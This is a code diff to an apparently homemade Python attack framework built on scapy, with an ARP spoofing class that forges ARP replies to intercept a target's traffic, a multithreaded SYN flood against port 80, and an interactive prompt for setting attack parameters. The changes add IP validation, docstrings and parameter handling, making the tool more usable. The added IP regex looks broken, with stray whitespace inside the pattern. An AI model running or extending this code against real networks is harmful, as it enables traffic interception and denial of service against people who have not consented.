@@ -15,17 +15,22 @@ todo:
 
 from scapy.all import *
 from time import sleep
+import re
 import sys
 import logging
 import threading
 import argparse
 
 
+
 logging.basicConfig(level=logging.INFO)
 
 MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"
 IPV4_BROADCAST = "255.255.255.255"
-
+IP_REGEX = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
+    25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
+    25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
+    25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)'''
 
 class Exploit(object):
 	'''
@@ -65,18 +70,18 @@ class Exploit(object):
 	def setup(self):
 		self.base()
 
-	def exploit(self):
-		pass
-
-	def restore(self):
-		pass
-
 	def show_params(self):
+		'''
+		Prints all parameters
+		'''
 		print(f"{'Parameter':20}\tValue")
 		for param, value in self.params.items():
 			print(f"{param:20}\t{value}")
 
 	def validate_params(self):
+		'''
+		Basic validation: ensures all required parameters are set
+		'''
 		for value in self.params.values():
 			if value is None:
 				return False
@@ -102,6 +107,12 @@ class Exploit(object):
 		Resolves router IP address
 		'''
 		self.router_ip = conf.route.route("0.0.0.0")[2]
+
+	def is_valid_ip(self, ip: str) -> bool:
+		'''
+		Validates if entered IP is valid or not
+		'''
+		return re.search(IP_REGEX, ip)
 
 	def mac_from_ip(self, ip: str) -> str:
 		'''
@@ -139,23 +150,36 @@ class ARPSpoof(Exploit):
 			"delay": self.delay
 		}
 
-	def setup(self, gateway_ip: str, target_ip: str, verbosity: int = 0, delay: float = 0.2):
+	def setup(self) -> bool:
 		if self.base():
-			self.verbosity = verbosity
-			self.gateway_ip = gateway_ip
-			self.target_ip = target_ip
-			self.delay = delay
+			try:
+				assert self.is_valid_ip(self.gateway_ip)
+			except AssertionError:
+				print("Invalid gateway IP!")
+				return False
 
-			self.gateway_mac = self.mac_from_ip(gateway_ip)
-			self.target_mac = self.mac_from_ip(target_ip)
+			try:
+				assert self.is_valid_ip(self.target_ip)
+			except AssertionError:
+				print("Invalid target IP!")
+				return False
+
+			self.gateway_mac = self.mac_from_ip(self.gateway_ip)
+			self.target_mac = self.mac_from_ip(self.target_ip)
 
 			self.run = True # boolean to handle exploit loop 
+
+			return True
+		else:
+			return False
 
 	def exploit(self):
 		'''
 		As ARP tables have a decay timing, to perpetutate this attack packets need to be constantly sent.
 		'''
 		logging.info(f"Beginning ARP spoofing attack on {self.target_ip}")
+
+		self.setup() 
 
 		target_arp_pkt = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.own_mac)
 		gateway_arp_pkt = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
@@ -278,6 +302,7 @@ class SYNFlood(Exploit):
 		logging.info(f"Thread {thread_id} starting!")
 		flood_pkt = IP(dst=self.target_ip)/TCP(flags="S", sport=RandShort(), dport=80)
 		send(flood_pkt, loop=1, verbose=0)
+
 
 class WayyangPrompt(object):
 	'''
@@ -405,7 +430,9 @@ class WayyangPrompt(object):
 		elif len(command_list) == 3:
 			verb, param, value = command_list
 			if param in self.current_exploit.params.keys():
-				pass
+				self.current_exploit.params[param] = value
+			else:
+				print("Invalid parameter value!")
 		
 		# pass
 
